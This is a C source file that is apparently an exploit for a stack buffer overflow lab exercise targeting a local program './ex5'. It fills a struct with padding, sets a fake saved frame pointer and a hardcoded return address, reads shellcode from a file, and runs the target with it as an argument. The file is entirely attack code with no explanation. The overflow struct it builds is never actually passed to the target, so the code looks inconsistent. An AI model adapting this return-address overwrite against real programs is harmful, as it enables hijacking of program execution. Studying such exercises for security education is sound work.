#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <stdio.h>

struct {
// buf is 100 (we need 22 bytes to write at the start of it)
 char buf[78];
 unsigned char shellcode[22];
 int chars_read_nr;
 char padding[8];
 uint32_t saved_ebp;
 uint32_t return_addr;
 char null;
} overflow;

unsigned char shellcode[22];

int main (int argc, char *argv[]) {
 int fd;
 int shellcode_size;
 memset(&overflow, 'A', sizeof(overflow));
 overflow.null = 0;

 overflow.saved_ebp = 0x42424242;
 overflow.return_addr = 0x08049740;

 memset(shellcode, 0, sizeof(shellcode));
 fd = open("shellcode", O_RDONLY);
 shellcode_size = read(fd, shellcode, sizeof(shellcode));
 printf("%d\n", shellcode_size );
 close(fd);

 char *const exec_argv[] = {
   "./ex5",
   (char*)shellcode,
   NULL
 };

 execv(exec_argv[0], exec_argv);

 return EXIT_SUCCESS;
}